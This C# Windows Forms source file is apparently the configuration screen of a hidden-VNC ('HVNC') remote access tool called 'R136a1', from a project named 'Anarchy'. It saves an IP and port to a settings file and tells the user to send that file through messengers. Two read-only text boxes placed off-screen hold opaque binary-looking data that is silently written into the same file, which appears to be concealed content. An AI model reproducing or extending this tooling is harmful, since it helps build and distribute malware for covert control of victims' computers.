using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;

namespace Anarchy.Forms
{
    public class HVNCForm : Form
    {
        private IContainer components;

        private Guna2Button guna2Button1;

        private Guna2TextBox TextBox1;

        private Guna2TextBox guna2TextBox1;

        private Guna2TextBox TextBox2;

        private Label label3;

        private Guna2Elipse guna2Elipse1;

        private Guna2DragControl guna2DragControl1;

        private Guna2Elipse guna2Elipse2;

        private SiticoneControlBox siticoneControlBox2;

        private Label label1;

        private SiticoneControlBox siticoneControlBox1;

        private Guna2TextBox guna2TextBox2;

        private Label label2;

        public HVNCForm()
        {
            InitializeComponent();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog;
            saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "HVNC> (settings) (*.ddm)|*.ddm | all(*.*)|*.*";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                StreamWriter streamWriter;
                streamWriter = new StreamWriter(saveFileDialog.FileName);
                streamWriter.WriteLine(TextBox1.Text);
                streamWriter.WriteLine(guna2TextBox1.Text);
                streamWriter.WriteLine(TextBox2.Text);
                streamWriter.WriteLine(guna2TextBox2.Text);
                streamWriter.Close();
                MessageBox.Show("Send the created file into one of these messengers", "Important!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                new Form4().ShowDialog();
                Close();
            }
        }

        private void cbMonitors_SelectedIndexChanged(object sender, EventArgs e)
        {
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
        }

        private void cmbType_SelectedIndexChanged(object sender, EventArgs e)
        {
        }

        private void guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void TextBox3_TextChanged(object sender, EventArgs e)
        {
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            new SForm2().ShowDialog();
        }

        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Hide();
        }

        private void TextBox2_TextChanged(object sender, EventArgs e)
        {
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            components = new Container();
            ComponentResourceManager resources;
            resources = new ComponentResourceManager(typeof(HVNCForm));
            guna2Button1 = new Guna2Button();
            TextBox1 = new Guna2TextBox();
            guna2TextBox1 = new Guna2TextBox();
            TextBox2 = new Guna2TextBox();
            label3 = new Label();
            guna2Elipse1 = new Guna2Elipse(components);
            guna2DragControl1 = new Guna2DragControl(components);
            guna2Elipse2 = new Guna2Elipse(components);
            siticoneControlBox2 = new SiticoneControlBox();
            label1 = new Label();
            siticoneControlBox1 = new SiticoneControlBox();
            guna2TextBox2 = new Guna2TextBox();
            label2 = new Label();
            SuspendLayout();
            guna2Button1.CheckedState.Parent = guna2Button1;
            guna2Button1.CustomImages.Parent = guna2Button1;
            guna2Button1.FillColor = Color.FromArgb(255, 128, 0);
            guna2Button1.Font = new Font("Segoe UI", 9f);
            guna2Button1.ForeColor = Color.White;
            guna2Button1.HoverState.Parent = guna2Button1;
            guna2Button1.Location = new Point(157, 117);
            guna2Button1.Name = "guna2Button1";
            guna2Button1.ShadowDecoration.Parent = guna2Button1;
            guna2Button1.Size = new Size(106, 30);
            guna2Button1.TabIndex = 0;
            guna2Button1.Text = "Create ";
            guna2Button1.Click += new EventHandler(guna2Button1_Click);
            TextBox1.Animated = true;
            TextBox1.BackColor = Color.Transparent;
            TextBox1.BorderColor = Color.FromArgb(64, 72, 75);
            TextBox1.BorderRadius = 5;
            TextBox1.Cursor = Cursors.IBeam;
            TextBox1.DefaultText = "u3D\ufffdZ\u0002A\ufffdC\ufffd\ufffd\ufffdB\ufffd\u0004\b8\u0004\vu C\ufffd\u0004\vA8\u0004\vu\u0016\ufffd\u0004\n\ufffd\ufffd\u0004\v\ufffdA\ufffd\u0004\v\ufffdD\ufffd\u0005v\ufffd\u0001 \ufffd\u00023\ufffd\ufffd\ufffd\u0003A\ufffd@\ufffd;\ufffdr\ufffd\ufffd\ufffdu\fH\ufffd\u00158\ufffd\u0001 I\ufffd\ufffd\ufffd\u000e\ufffd\u0001   \ufffd\u000fH\ufffd";
            TextBox1.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
            TextBox1.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
            TextBox1.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
            TextBox1.DisabledState.Parent = TextBox1;
            TextBox1.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
            TextBox1.FillColor = Color.FromArgb(41, 46, 48);
            TextBox1.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
            TextBox1.FocusedState.Parent = TextBox1;
            TextBox1.Font = new Font("Segoe UI", 9f);
            TextBox1.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
            TextBox1.HoverState.Parent = TextBox1;
            TextBox1.Location = new Point(891, 495);
            TextBox1.Name = "TextBox1";
            TextBox1.PasswordChar = '\0';
            TextBox1.PlaceholderText = "";
            TextBox1.ReadOnly = true;
            TextBox1.SelectedText = "";
            TextBox1.SelectionStart = 91;
            TextBox1.ShadowDecoration.Color = Color.FromArgb(64, 72, 75);
            TextBox1.ShadowDecoration.Depth = 10;
            TextBox1.ShadowDecoration.Enabled = true;
            TextBox1.ShadowDecoration.Parent = TextBox1;
            TextBox1.Size = new Size(102, 45);
            TextBox1.TabIndex = 35;
            guna2TextBox1.Animated = true;
            guna2TextBox1.BackColor = Color.Transparent;
            guna2TextBox1.BorderColor = Color.FromArgb(64, 72, 75);
            guna2TextBox1.BorderRadius = 5;
            guna2TextBox1.Cursor = Cursors.IBeam;
            guna2TextBox1.DefaultText = resources.GetString("guna2TextBox1.DefaultText");
            guna2TextBox1.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
            guna2TextBox1.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
            guna2TextBox1.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
            guna2TextBox1.DisabledState.Parent = guna2TextBox1;
            guna2TextBox1.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
            guna2TextBox1.FillColor = Color.FromArgb(41, 46, 48);
            guna2TextBox1.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
            guna2TextBox1.FocusedState.Parent = guna2TextBox1;
            guna2TextBox1.Font = new Font("Segoe UI", 9f);
            guna2TextBox1.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
            guna2TextBox1.HoverState.Parent = guna2TextBox1;
            guna2TextBox1.Location = new Point(891, 444);
            guna2TextBox1.Name = "guna2TextBox1";
            guna2TextBox1.PasswordChar = '\0';
            guna2TextBox1.PlaceholderText = "";
            guna2TextBox1.ReadOnly = true;
            guna2TextBox1.SelectedText = "";
            guna2TextBox1.SelectionStart = 6077;
            guna2TextBox1.ShadowDecoration.Color = Color.FromArgb(64, 72, 75);
            guna2TextBox1.ShadowDecoration.Depth = 10;
            guna2TextBox1.ShadowDecoration.Enabled = true;
            guna2TextBox1.ShadowDecoration.Parent = guna2TextBox1;
            guna2TextBox1.Size = new Size(102, 45);
            guna2TextBox1.TabIndex = 53;
            TextBox2.Animated = true;
            TextBox2.BackColor = Color.Transparent;
            TextBox2.BorderColor = Color.FromArgb(64, 72, 75);
            TextBox2.BorderRadius = 5;
            TextBox2.Cursor = Cursors.IBeam;
            TextBox2.DefaultText = "127.0.0.1";
            TextBox2.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
            TextBox2.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
            TextBox2.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
            TextBox2.DisabledState.Parent = TextBox2;
            TextBox2.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
            TextBox2.FillColor = Color.FromArgb(41, 46, 48);
            TextBox2.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
            TextBox2.FocusedState.Parent = TextBox2;
            TextBox2.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            TextBox2.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
            TextBox2.HoverState.Parent = TextBox2;
            TextBox2.Location = new Point(9, 55);
            TextBox2.MaxLength = 30;
            TextBox2.Multiline = true;
            TextBox2.Name = "TextBox2";
            TextBox2.PasswordChar = '\0';
            TextBox2.PlaceholderText = "";
            TextBox2.SelectedText = "";
            TextBox2.ShadowDecoration.Color = Color.FromArgb(64, 72, 75);
            TextBox2.ShadowDecoration.Depth = 10;
            TextBox2.ShadowDecoration.Enabled = true;
            TextBox2.ShadowDecoration.Parent = TextBox2;
            TextBox2.Size = new Size(141, 30);
            TextBox2.TabIndex = 21;
            TextBox2.TextChanged += new EventHandler(TextBox2_TextChanged);
            label3.AutoSize = true;
            label3.Font = new Font("Segoe UI", 10f, FontStyle.Regular, GraphicsUnit.Point, 0);
            label3.ForeColor = Color.Honeydew;
            label3.Location = new Point(5, 33);
            label3.Name = "label3";
            label3.Size = new Size(24, 19);
            label3.TabIndex = 55;
            label3.Text = "IP:";
            guna2Elipse1.BorderRadius = 9;
            guna2Elipse1.TargetControl = this;
            guna2DragControl1.TargetControl = this;
            guna2Elipse2.BorderRadius = 13;
            guna2Elipse2.TargetControl = guna2Button1;
            siticoneControlBox2.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            siticoneControlBox2.BorderRadius = 10;
            siticoneControlBox2.ControlBoxType = ControlBoxType.MinimizeBox;
            siticoneControlBox2.FillColor = Color.FromArgb(32, 32, 32);
            siticoneControlBox2.HoveredState.Parent = siticoneControlBox2;
            siticoneControlBox2.IconColor = Color.White;
            siticoneControlBox2.Location = new Point(167, 2);
            siticoneControlBox2.Name = "siticoneControlBox2";
            siticoneControlBox2.ShadowDecoration.Parent = siticoneControlBox2;
            siticoneControlBox2.Size = new Size(45, 25);
            siticoneControlBox2.TabIndex = 75;
            label1.AutoSize = true;
            label1.Font = new Font("Segoe UI", 10f, FontStyle.Regular, GraphicsUnit.Point, 0);
            label1.ForeColor = Color.Honeydew;
            label1.Location = new Point(5, 7);
            label1.Name = "label1";
            label1.Size = new Size(108, 19);
            label1.TabIndex = 73;
            label1.Text = "R136a1 - HVNC";
            siticoneControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            siticoneControlBox1.BorderRadius = 10;
            siticoneControlBox1.FillColor = Color.FromArgb(32, 32, 32);
            siticoneControlBox1.HoveredState.FillColor = Color.FromArgb(232, 17, 35);
            siticoneControlBox1.HoveredState.IconColor = Color.White;
            siticoneControlBox1.HoveredState.Parent = siticoneControlBox1;
            siticoneControlBox1.IconColor = Color.White;
            siticoneControlBox1.Location = new Point(218, 2);
            siticoneControlBox1.Name = "siticoneControlBox1";
            siticoneControlBox1.ShadowDecoration.Parent = siticoneControlBox1;
            siticoneControlBox1.Size = new Size(45, 25);
            siticoneControlBox1.TabIndex = 74;
            siticoneControlBox1.Click += new EventHandler(siticoneControlBox1_Click);
            guna2TextBox2.Animated = true;
            guna2TextBox2.BackColor = Color.Transparent;
            guna2TextBox2.BorderColor = Color.FromArgb(64, 72, 75);
            guna2TextBox2.BorderRadius = 5;
            guna2TextBox2.Cursor = Cursors.IBeam;
            guna2TextBox2.DefaultText = "1337\r\n\r\n";
            guna2TextBox2.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
            guna2TextBox2.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
            guna2TextBox2.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
            guna2TextBox2.DisabledState.Parent = guna2TextBox2;
            guna2TextBox2.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
            guna2TextBox2.FillColor = Color.FromArgb(41, 46, 48);
            guna2TextBox2.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
            guna2TextBox2.FocusedState.Parent = guna2TextBox2;
            guna2TextBox2.Font = new Font("Segoe UI", 9f);
            guna2TextBox2.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
            guna2TextBox2.HoverState.Parent = guna2TextBox2;
            guna2TextBox2.Location = new Point(9, 112);
            guna2TextBox2.MaxLength = 6;
            guna2TextBox2.Multiline = true;
            guna2TextBox2.Name = "guna2TextBox2";
            guna2TextBox2.PasswordChar = '\0';
            guna2TextBox2.PlaceholderText = "";
            guna2TextBox2.SelectedText = "";
            guna2TextBox2.ShadowDecoration.Color = Color.FromArgb(64, 72, 75);
            guna2TextBox2.ShadowDecoration.Depth = 10;
            guna2TextBox2.ShadowDecoration.Enabled = true;
            guna2TextBox2.ShadowDecoration.Parent = guna2TextBox2;
            guna2TextBox2.Size = new Size(123, 35);
            guna2TextBox2.TabIndex = 76;
            label2.AutoSize = true;
            label2.Font = new Font("Segoe UI", 10f, FontStyle.Regular, GraphicsUnit.Point, 0);
            label2.ForeColor = Color.Honeydew;
            label2.Location = new Point(5, 90);
            label2.Name = "label2";
            label2.Size = new Size(45, 19);
            label2.TabIndex = 77;
            label2.Text = "PORT:";
            AutoScaleDimensions = new SizeF(6f, 13f);
            AutoScaleMode = AutoScaleMode.Font;
            BackColor = Color.FromArgb(32, 32, 32);
            ClientSize = new Size(267, 155);
            Controls.Add(label2);
            Controls.Add(guna2TextBox2);
            Controls.Add(siticoneControlBox2);
            Controls.Add(label1);
            Controls.Add(siticoneControlBox1);
            Controls.Add(label3);
            Controls.Add(TextBox2);
            Controls.Add(guna2TextBox1);
            Controls.Add(TextBox1);
            Controls.Add(guna2Button1);
            FormBorderStyle = FormBorderStyle.None;
            Icon = (Icon)resources.GetObject("$this.Icon");
            Name = "HVNCForm";
            Opacity = 0.99;
            StartPosition = FormStartPosition.CenterScreen;
            Text = "~";
            Load += new EventHandler(Form1_Load);
            ResumeLayout(false);
            PerformLayout();
        }
    }
}
